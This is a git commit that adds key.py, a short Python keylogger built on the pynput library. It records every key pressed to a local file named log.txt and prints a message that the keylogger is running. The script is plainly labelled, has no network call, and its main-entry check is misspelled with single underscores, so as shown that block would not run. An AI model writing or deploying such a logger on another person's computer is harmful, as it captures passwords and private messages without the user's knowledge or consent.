dba19b734f1432adfc60e5c96a4ff17ed1380c01
Aishwaryabs987 <149481392+Aishwaryabs987@users.noreply.github.com>
2025-04-21 17:21:55 +0530

    Create key.py

---
+++ key.py
@@ -0,0 +1,11 @@
+from pynput.keyboard import Listener
+def log_keystroke(key):
+    key = str(key).replace("'","")
+    with open("log.txt", "a") as log_file:
+        log_file.write(key + "\n")
+def start_logging():
+    with Listener(on_press=log_keystroke) as listener:
+        listener.join()
+if _name_ == "_main_":
+    print("[+] Keylogger is running.... (press CTRL + C to stop)")
+    start_logging()
